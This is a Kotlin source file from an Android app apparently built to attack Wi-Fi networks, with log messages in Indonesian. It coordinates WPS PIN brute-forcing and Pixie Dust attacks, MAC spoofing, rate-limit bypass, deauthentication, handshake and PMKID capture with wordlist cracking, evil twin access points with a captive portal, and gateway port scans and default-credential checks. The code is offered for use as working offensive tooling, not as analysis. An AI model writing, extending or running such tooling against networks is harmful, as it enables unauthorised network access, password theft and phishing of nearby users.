package com.wipwn.app.repository

import android.content.Context
import android.os.SystemClock
import com.wipwn.app.data.AttackConfig
import com.wipwn.app.data.AttackError
import com.wipwn.app.data.AttackHistoryStore
import com.wipwn.app.data.AttackResult
import com.wipwn.app.data.AttackType
import com.wipwn.app.data.PinGenerator
import com.wipwn.app.data.WifiNetwork
import com.wipwn.app.data.NetworkSecurityAnalyzer
import com.wipwn.app.util.MacSpoofer
import com.wipwn.app.util.NetworkRecon
import com.wipwn.app.util.RootUtil
import com.wipwn.app.util.ShellExecutor
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.coroutines.withContext
import kotlinx.coroutines.sync.Mutex
import sangiorgi.wps.lib.ConnectionUpdateCallback
import sangiorgi.wps.lib.WpsConnectionManager
import sangiorgi.wps.lib.models.NetworkToTest
import kotlin.coroutines.resume

/**
 * Central business-logic layer. Replaces the monolithic ViewModel: every
 * screen-level VM talks to this repository instead of touching the library,
 * shell or DataStore directly.
 *
 * Lifecycle: created once in [com.wipwn.app.WipwnApp] and shared across all
 * ViewModels. [shutdown] is not called by the app (matches
 * [android.app.Application] lifetime) but is available for tests.
 */
class WpsRepository(
    private val appContext: Context,
    private val shell: ShellExecutor,
    private val historyStore: AttackHistoryStore,
    private val scope: CoroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
) {
    private val attackLock = Mutex()
    private val scanner = WifiScanner(appContext)
    private val envPreparer = EnvironmentPreparer(appContext, shell) { log -> emitEvent(AttackEvent.Log(log)) }
    private val pixieInstrumentation = PixieDustInstrumentation(shell) { stage, msg -> emitTaggedLog(stage, msg) }

    // ── New modules ────────────────────────────────────────────────────
    val macSpoofer = MacSpoofer(shell)
    val networkRecon = NetworkRecon(shell)
    private val rateLimitBypass = RateLimitBypass(shell, macSpoofer) { msg -> emitEvent(AttackEvent.Log(msg)) }
    private val handshakeCapturer = HandshakeCapturer(shell) { stage, msg -> emitTaggedLog(stage, msg) }
    private val deauthAttacker = DeauthAttacker(shell) { stage, msg -> emitTaggedLog(stage, msg) }
    private val evilTwinAttacker = EvilTwinAttacker(shell) { stage, msg -> emitTaggedLog(stage, msg) }
    // ── Init state ─────────────────────────────────────────────────────

    data class InitState(
        val isRooted: Boolean = false,
        val isChecking: Boolean = true,
        val isLibraryReady: Boolean = false,
        val error: String? = null
    )

    private val _initState = MutableStateFlow(InitState())
    val initState: StateFlow<InitState> = _initState.asStateFlow()

    // ── Cross-screen selection ─────────────────────────────────────────

    private val _selectedNetwork = MutableStateFlow<WifiNetwork?>(null)
    val selectedNetwork: StateFlow<WifiNetwork?> = _selectedNetwork.asStateFlow()

    fun selectNetwork(network: WifiNetwork) { _selectedNetwork.value = network }
    fun clearSelection() { _selectedNetwork.value = null }

    // ── Persistent history ─────────────────────────────────────────────

    val history: Flow<List<AttackResult>> = historyStore.history

    // ── WPS library ────────────────────────────────────────────────────

    private var wpsManager: WpsConnectionManager? = null

    /** Probe root + initialise the WPS library. Re-runnable (retry). */
    fun initialize() {
        scope.launch { doInitialize() }
    }

    private suspend fun doInitialize() {
        _initState.value = InitState(isChecking = true)

        val rooted = withContext(Dispatchers.IO) { RootUtil.isRooted() }
        if (!rooted) {
            _initState.value = InitState(
                isRooted = false,
                isChecking = false,
                error = "Perangkat tidak memiliki akses root!"
            )
            return
        }

        try {
            val manager = WpsConnectionManager(appContext)
            withContext(Dispatchers.IO) {
                manager.initialize().get()
                manager.awaitReady()
            }
            wpsManager = manager
            _initState.value = InitState(
                isRooted = true,
                isChecking = false,
                isLibraryReady = true
            )
        } catch (e: Exception) {
            _initState.value = InitState(
                isRooted = true,
                isChecking = false,
                isLibraryReady = false,
                error = "Gagal inisialisasi WPS library: ${e.message}"
            )
        }
    }

    // ── Scanning ───────────────────────────────────────────────────────

    suspend fun scanNetworks(): Result<List<WifiNetwork>> = scanner.scan()

    // ── MAC Spoofing ───────────────────────────────────────────────────

    fun spoofMac(targetMac: String? = null, iface: String = MacSpoofer.DEFAULT_IFACE): MacSpoofer.SpoofResult {
        emitTaggedLog("mac", "Spoofing MAC...")
        val result = if (targetMac != null) {
            macSpoofer.spoofTo(iface, targetMac)
        } else {
            macSpoofer.spoofRandom(iface)
        }
        if (result.success) {
            emitTaggedLog("mac", "✓ MAC spoofed: ${result.originalMac} → ${result.newMac}")
        } else {
            emitTaggedLog("mac", "✗ MAC spoof gagal: ${result.error}")
        }
        return result
    }

    fun restoreMac(originalMac: String, iface: String = MacSpoofer.DEFAULT_IFACE): MacSpoofer.SpoofResult {
        emitTaggedLog("mac", "Restoring MAC to $originalMac...")
        return macSpoofer.restore(iface, originalMac)
    }

    fun getCurrentMac(iface: String = MacSpoofer.DEFAULT_IFACE): String? = macSpoofer.getCurrentMac(iface)

    // ── Advanced attack tools ──────────────────────────────────────────

    fun getHandshakeCapturer(): HandshakeCapturer = handshakeCapturer
    fun getDeauthAttacker(): DeauthAttacker = deauthAttacker
    fun getEvilTwinAttacker(): EvilTwinAttacker = evilTwinAttacker
    fun getRateLimitBypass(): RateLimitBypass = rateLimitBypass

    // ── Attacks ────────────────────────────────────────────────────────

    /**
     * Events emitted during an attack. Exposed as a SharedFlow so multiple
     * VMs / UI pieces can subscribe without replays interfering.
     */
    sealed interface AttackEvent {
        data class Log(val line: String) : AttackEvent
        data class Progress(val message: String, val totalPins: Int) : AttackEvent
        data class PinCountDelta(val delta: Int) : AttackEvent
        data class SessionStarted(val sessionId: String) : AttackEvent
        data class Finished(val result: AttackResult) : AttackEvent
    }

    private val _attackEvents = MutableSharedFlow<AttackEvent>(
        replay = 0,
        extraBufferCapacity = 128
    )
    val attackEvents: kotlinx.coroutines.flow.SharedFlow<AttackEvent> = _attackEvents.asSharedFlow()

    /**
     * Run an attack. Suspends until finished. Guaranteed to emit exactly one
     * [AttackEvent.Finished] before returning.
     */
    suspend fun runAttack(
        network: WifiNetwork,
        type: AttackType,
        customPin: String? = null,
        config: AttackConfig = AttackConfig.forAttackType(type)
    ): AttackResult {
        val sessionId = "S-${System.currentTimeMillis()}"
        _attackEvents.emit(AttackEvent.SessionStarted(sessionId))
        emitTaggedLog("guard", "Session: $sessionId")

        if (!attackLock.tryLock()) {
            val busy = AttackResult(
                bssid = network.bssid,
                ssid = network.ssid,
                success = false,
                error = AttackError.Unknown("Masih ada serangan aktif, tunggu sampai selesai")
            )
            _attackEvents.emit(AttackEvent.Finished(busy))
            historyStore.add(busy)
            return busy
        }

        try {
            ensureAttackPrerequisites()?.let { guardError ->
                val blocked = AttackResult(
                    bssid = network.bssid,
                    ssid = network.ssid,
                    success = false,
                    error = guardError
                )
                _attackEvents.emit(AttackEvent.Finished(blocked))
                historyStore.add(blocked)
                return blocked
            }

            val manager = wpsManager ?: run {
                val r = AttackResult(
                    bssid = network.bssid,
                    ssid = network.ssid,
                    success = false,
                    error = AttackError.NoRoot("WPS library belum siap")
                )
                _attackEvents.emit(AttackEvent.Finished(r))
                historyStore.add(r)
                return r
            }

            // Prepare environment
            emitTaggedLog("prepare", "Menyiapkan environment...")
            val prepResult = withContext(Dispatchers.IO) { envPreparer.prepare() }
            if (prepResult is EnvironmentPreparer.EnvPrep.Failed) {
                val r = AttackResult(
                    bssid = network.bssid,
                    ssid = network.ssid,
                    success = false,
                    error = AttackError.EnvironmentFailed(prepResult.reason)
                )
                _attackEvents.emit(AttackEvent.Finished(r))
                historyStore.add(r)
                return r
            }
            val startedAt = SystemClock.elapsedRealtime()
            val result = withTimeoutOrNull(config.attackTimeoutMs) {
                awaitAttack(manager, network, type, customPin, config)
            } ?: run {
                manager.cancel()
                emitTaggedLog("guard", "Watchdog timeout ${config.attackTimeoutMs}ms, cancel attack")
                val timeoutResult = AttackResult(
                    bssid = network.bssid,
                    ssid = network.ssid,
                    success = false,
                    error = AttackError.Unknown("Timeout: serangan terlalu lama, dibatalkan watchdog")
                )
                _attackEvents.emit(AttackEvent.Finished(timeoutResult))
                historyStore.add(timeoutResult)
                timeoutResult
            }
            emitTaggedLog("result", "Session selesai dalam ${SystemClock.elapsedRealtime() - startedAt}ms")
            return result
        } finally {
            // Restore WiFi setelah serangan selesai biar user ga perlu
            // manual toggle WiFi on
            withContext(Dispatchers.IO) {
                runCatching { envPreparer.restoreWifi() }
            }
            attackLock.unlock()
        }
    }

    private suspend fun awaitAttack(
        manager: WpsConnectionManager,
        network: WifiNetwork,
        type: AttackType,
        customPin: String?,
        config: AttackConfig
    ): AttackResult = suspendCancellableCoroutine { cont ->
        val finished = java.util.concurrent.atomic.AtomicBoolean(false)
        val sideJobs = mutableListOf<Job>()
        val logcatProcRef = java.util.concurrent.atomic.AtomicReference<Process?>(null)

        fun stopSideJobs() {
            sideJobs.forEach { it.cancel() }
            sideJobs.clear()
            logcatProcRef.getAndSet(null)?.let { p ->
                runCatching { p.destroy() }
            }
        }

        fun finish(r: AttackResult) {
            if (!finished.compareAndSet(false, true)) return
            stopSideJobs()
            scope.launch {
                _attackEvents.emit(AttackEvent.Finished(r))
                historyStore.add(r)
            }
            if (cont.isActive) cont.resume(r)
        }

        cont.invokeOnCancellation {
            finished.set(true)
            stopSideJobs()
            runCatching { manager.cancel() }
        }

        val callback = object : ConnectionUpdateCallback {
            override fun create(title: String, message: String, progress: Int) {
                emitTaggedLog("run", "▶ $message")
                emitEvent(AttackEvent.Progress(message, progress))
            }
            override fun updateMessage(message: String) {
                emitTaggedLog("run", "  $message")
                emitEvent(AttackEvent.Progress(message, -1))
            }
            override fun updateCount(increment: Int) {
                emitEvent(AttackEvent.PinCountDelta(increment))
            }
            override fun error(message: String, type: Int) {
                val err = AttackError.fromLibraryErrorType(type, message)
                emitTaggedLog("result", "✗ ${err.message}")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        success = false,
                        error = err
                    )
                )
            }
            override fun success(networkToTest: NetworkToTest, isRoot: Boolean) {
                val pin = networkToTest.pins?.firstOrNull()
                val pass = networkToTest.password
                emitTaggedLog("result", "✓ BERHASIL! PIN: ${pin ?: "-"}")
                if (!pass.isNullOrEmpty()) emitTaggedLog("result", "✓ Password: $pass")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        pin = pin,
                        password = pass,
                        success = true
                    )
                )
            }
            override fun onPixieDustSuccess(pin: String, password: String) {
                emitTaggedLog("pixie", "✓ Pixie Dust BERHASIL!")
                emitTaggedLog("pixie", "✓ PIN: $pin")
                if (password.isNotEmpty()) emitTaggedLog("pixie", "✓ Password: $password")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        pin = pin,
                        password = password,
                        success = true
                    )
                )
            }
            override fun onPixieDustFailure(error: String) {
                emitTaggedLog("pixie", "✗ Pixie Dust gagal: $error")
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        success = false,
                        error = AttackError.PixieDustNotVulnerable(error)
                    )
                )
            }
        }

        if (type == AttackType.PIXIE_DUST) {
            pixieInstrumentation.narratePlan(network)
            sideJobs += scope.launch { pixieInstrumentation.heartbeat() }
            sideJobs += scope.launch { pixieInstrumentation.tailLogcat(logcatProcRef) }
        }

        scope.launch {
            runCatching {
                when (type) {
                    AttackType.KNOWN_PINS -> manager.testPins(
                        network.bssid, network.ssid, config.knownPins.toTypedArray(), callback
                    )
                    AttackType.PIXIE_DUST -> manager.pixieDust(
                        network.bssid, network.ssid, callback
                    )
                    AttackType.BRUTE_FORCE -> manager.bruteForce(
                        network.bssid, network.ssid, config.bruteForceDelayMs, callback
                    )
                    AttackType.CUSTOM_PIN -> {
                        val pin = customPin ?: return@runCatching
                        manager.testPins(network.bssid, network.ssid, arrayOf(pin), callback)
                    }
                    AttackType.ALGORITHMIC_PIN -> {
                        val fingerprint = NetworkSecurityAnalyzer.fingerprintFromBssidPublic(network.bssid)
                        val pins = PinGenerator.generate(network.bssid, fingerprint.vendor)
                        if (pins.isEmpty()) {
                            emitTaggedLog("algo", "✗ Tidak ada algorithmic PIN untuk vendor ${fingerprint.vendor}")
                            finish(AttackResult(
                                bssid = network.bssid, ssid = network.ssid,
                                success = false,
                                error = AttackError.Unknown("Tidak ada algorithmic PIN untuk BSSID ini (vendor: ${fingerprint.vendor})")
                            ))
                            return@runCatching
                        }
                        emitTaggedLog("algo", "Testing ${pins.size} algorithmic PINs for vendor ${fingerprint.vendor}...")
                        pins.forEach { gp -> emitTaggedLog("algo", "  ${gp.algorithm}: ${gp.pin} (${gp.confidence})") }
                        val pinArray = pins.map { it.pin }.toTypedArray()
                        manager.testPins(network.bssid, network.ssid, pinArray, callback)
                    }
                    AttackType.NULL_PIN -> {
                        emitTaggedLog("null-pin", "Testing null/empty PIN variants...")
                        val nullPins = arrayOf("00000000", "        ", "12345670", "00000001")
                        manager.testPins(network.bssid, network.ssid, nullPins, callback)
                    }
                    // Non-WPS attacks are handled in runAdvancedAttack
                    AttackType.DEAUTH,
                    AttackType.HANDSHAKE_CAPTURE,
                    AttackType.PMKID,
                    AttackType.EVIL_TWIN,
                    AttackType.RECON -> {
                        // These are handled separately — should not reach here
                        finish(AttackResult(
                            bssid = network.bssid, ssid = network.ssid,
                            success = false,
                            error = AttackError.Unknown("Use runAdvancedAttack() for ${type.displayName}")
                        ))
                    }
                }
            }.onFailure { e ->
                finish(
                    AttackResult(
                        bssid = network.bssid,
                        ssid = network.ssid,
                        success = false,
                        error = AttackError.Unknown("Exception: ${e.message}", e)
                    )
                )
            }
        }
    }

    private fun emitEvent(event: AttackEvent) {
        // tryEmit is safe because we have extraBufferCapacity.
        _attackEvents.tryEmit(event)
    }

    private fun emitTaggedLog(stage: String, message: String) {
        emitEvent(AttackEvent.Log("[${stage.lowercase()}] $message"))
    }

    // ── Advanced (non-WPS) attacks ──────────────────────────────────────

    /**
     * Run advanced attacks that don't go through the WPS library.
     * Deauth, Handshake Capture, PMKID, Evil Twin, Recon.
     */
    suspend fun runAdvancedAttack(
        network: WifiNetwork,
        type: AttackType,
        config: AttackConfig = AttackConfig()
    ): AttackResult {
        val sessionId = "A-${System.currentTimeMillis()}"
        _attackEvents.emit(AttackEvent.SessionStarted(sessionId))
        emitTaggedLog("advanced", "Session: $sessionId — ${type.displayName}")

        if (!attackLock.tryLock()) {
            val busy = AttackResult(
                bssid = network.bssid, ssid = network.ssid,
                success = false, attackType = type,
                error = AttackError.Unknown("Masih ada serangan aktif")
            )
            _attackEvents.emit(AttackEvent.Finished(busy))
            historyStore.add(busy)
            return busy
        }

        try {
            val result = when (type) {
                AttackType.DEAUTH -> runDeauthAttack(network, config)
                AttackType.HANDSHAKE_CAPTURE -> runHandshakeCapture(network, config)
                AttackType.PMKID -> runPmkidAttack(network, config)
                AttackType.EVIL_TWIN -> runEvilTwin(network, config)
                AttackType.RECON -> runRecon(network, config)
                else -> {
                    // WPS attacks go through runAttack()
                    return runAttack(network, type, config = config)
                }
            }
            _attackEvents.emit(AttackEvent.Finished(result))
            historyStore.add(result)
            return result
        } finally {
            attackLock.unlock()
        }
    }

    private suspend fun runDeauthAttack(network: WifiNetwork, config: AttackConfig): AttackResult {
        emitTaggedLog("deauth", "Starting deauth attack on ${network.displayName}")

        // Enable monitor mode
        val (monOk, monIface) = handshakeCapturer.enableMonitorMode()
        if (!monOk) {
            return AttackResult(
                bssid = network.bssid, ssid = network.ssid,
                success = false, attackType = AttackType.DEAUTH,
                error = AttackError.MonitorModeFailed()
            )
        }

        try {
            val deauthConfig = DeauthAttacker.DeauthConfig(
                count = config.deauthCount,
                targetClient = config.deauthTargetClient
            )
            val result = deauthAttacker.attack(monIface, network.bssid, deauthConfig)

            return AttackResult(
                bssid = network.bssid, ssid = network.ssid,
                success = result.success, attackType = AttackType.DEAUTH,
                error = result.error?.let { AttackError.Unknown(it) }
            )
        } finally {
            handshakeCapturer.disableMonitorMode(monIface)
        }
    }

    private suspend fun runHandshakeCapture(network: WifiNetwork, config: AttackConfig): AttackResult {
        emitTaggedLog("capture", "Starting handshake capture for ${network.displayName}")

        val (monOk, monIface) = handshakeCapturer.enableMonitorMode()
        if (!monOk) {
            return AttackResult(
                bssid = network.bssid, ssid = network.ssid,
                success = false, attackType = AttackType.HANDSHAKE_CAPTURE,
                error = AttackError.MonitorModeFailed()
            )
        }

        try {
            val capture = handshakeCapturer.captureHandshake(
                network, monIface, config.captureTimeoutSec
            )

            if (!capture.success || capture.captureFile == null) {
                return AttackResult(
                    bssid = network.bssid, ssid = network.ssid,
                    success = false, attackType = AttackType.HANDSHAKE_CAPTURE,
                    captureFile = capture.captureFile,
                    error = AttackError.CaptureFailed(capture.error ?: "Handshake not found")
                )
            }

            // Try to crack if wordlist is available
            val wordlist = config.wordlistPath ?: HandshakeCapturer.DEFAULT_WORDLIST
            val crack = handshakeCapturer.crackWithWordlist(capture.captureFile, network.bssid, wordlist)

            return AttackResult(
                bssid = network.bssid, ssid = network.ssid,
                success = crack.success,
                password = crack.password,
                attackType = AttackType.HANDSHAKE_CAPTURE,
                captureFile = capture.captureFile,
                algorithmUsed = crack.method,
                error = if (!crack.success) AttackError.Unknown(crack.error ?: "Crack failed") else null
            )
        } finally {
            handshakeCapturer.disableMonitorMode(monIface)
        }
    }

    private suspend fun runPmkidAttack(network: WifiNetwork, config: AttackConfig): AttackResult {
        emitTaggedLog("pmkid", "Starting PMKID attack for ${network.displayName}")

        val capture = handshakeCapturer.capturePmkid(
            network, timeoutSec = config.captureTimeoutSec
        )

        if (!capture.success || capture.captureFile == null) {
            return AttackResult(
                bssid = network.bssid, ssid = network.ssid,
                success = false, attackType = AttackType.PMKID,
                error = AttackError.CaptureFailed(capture.error ?: "PMKID not found")
            )
        }

        // Try to crack
        val wordlist = config.wordlistPath ?: HandshakeCapturer.DEFAULT_WORDLIST
        val crack = handshakeCapturer.crackWithWordlist(capture.captureFile, network.bssid, wordlist)

        return AttackResult(
            bssid = network.bssid, ssid = network.ssid,
            success = crack.success,
            password = crack.password,
            attackType = AttackType.PMKID,
            captureFile = capture.captureFile,
            algorithmUsed = crack.method,
            error = if (!crack.success) AttackError.Unknown(crack.error ?: "Crack failed") else null
        )
    }

    private suspend fun runEvilTwin(network: WifiNetwork, config: AttackConfig): AttackResult {
        emitTaggedLog("eviltwin", "Starting Evil Twin for ${network.displayName}")

        val etConfig = EvilTwinAttacker.EvilTwinConfig(
            ssid = network.ssid,
            channel = config.evilTwinChannel,
            enableCaptivePortal = config.evilTwinCaptivePortal
        )

        val result = evilTwinAttacker.start(etConfig)

        return AttackResult(
            bssid = network.bssid, ssid = network.ssid,
            success = result.success, attackType = AttackType.EVIL_TWIN,
            error = result.error?.let { AttackError.Unknown(it) }
        )
    }

    private suspend fun runRecon(network: WifiNetwork, config: AttackConfig): AttackResult {
        emitTaggedLog("recon", "Starting network recon...")

        return withContext(Dispatchers.IO) {
            val recon = networkRecon.quickRecon()
            val sb = StringBuilder()
            sb.appendLine("Gateway: ${recon.gateway ?: "unknown"}")
            sb.appendLine("Local IP: ${recon.localIp ?: "unknown"}")
            sb.appendLine("Subnet: ${recon.subnet ?: "unknown"}")
            sb.appendLine("Devices found: ${recon.devices.size}")
            sb.appendLine("Admin panel: ${recon.adminPanelUrl ?: "N/A"} (${if (recon.adminPanelReachable) "reachable" else "unreachable"})")

            recon.devices.forEach { dev ->
                val label = if (dev.isGateway) " [GATEWAY]" else ""
                sb.appendLine("  ${dev.ip} — ${dev.mac ?: "?"}$label")
                emitTaggedLog("recon", "Device: ${dev.ip} (${dev.mac})$label")
            }

            // Port scan gateway
            if (config.reconPortScan && recon.gateway != null) {
                emitTaggedLog("recon", "Port scanning gateway ${recon.gateway}...")
                val portResult = networkRecon.portScan(recon.gateway)
                portResult.openPorts.forEach { port ->
                    sb.appendLine("  Port ${port.port} (${port.service}): OPEN")
                    emitTaggedLog("recon", "  Port ${port.port}/${port.service}: OPEN")
                }
            }

            // Default credential check
            if (config.reconDefaultCreds && recon.gateway != null) {
                emitTaggedLog("recon", "Checking default credentials...")
                val creds = networkRecon.checkDefaultCredentials(recon.gateway)
                creds.forEach { cred ->
                    sb.appendLine("  Default cred found: $cred")
                    emitTaggedLog("recon", "✓ Default cred: $cred")
                }
            }

            emitTaggedLog("recon", "✓ Recon complete")

            AttackResult(
                bssid = network.bssid, ssid = network.ssid,
                success = true, attackType = AttackType.RECON,
                reconData = sb.toString()
            )
        }
    }

    // ── Stop Evil Twin ─────────────────────────────────────────────────

    fun stopEvilTwin() {
        evilTwinAttacker.stop()
    }

    fun stopDeauth() {
        deauthAttacker.cancel()
    }

    fun cancelAttack() {
        wpsManager?.cancel()
        deauthAttacker.cancel()
    }

    suspend fun clearHistory() = historyStore.clear()

    fun shutdown() {
        wpsManager?.cleanup()
        wpsManager?.shutdown()
        wpsManager = null
        evilTwinAttacker.stop()
        deauthAttacker.cancel()
    }

    private suspend fun ensureAttackPrerequisites(): AttackError? {
        if (!_initState.value.isLibraryReady) {
            return AttackError.NoRoot("Library WPS belum siap.")
        }
        return runCatching {
            scanner.ensurePrerequisites()
            null
        }.getOrElse { AttackError.EnvironmentFailed(it.message ?: "Prerequisite gagal") }
    }
}
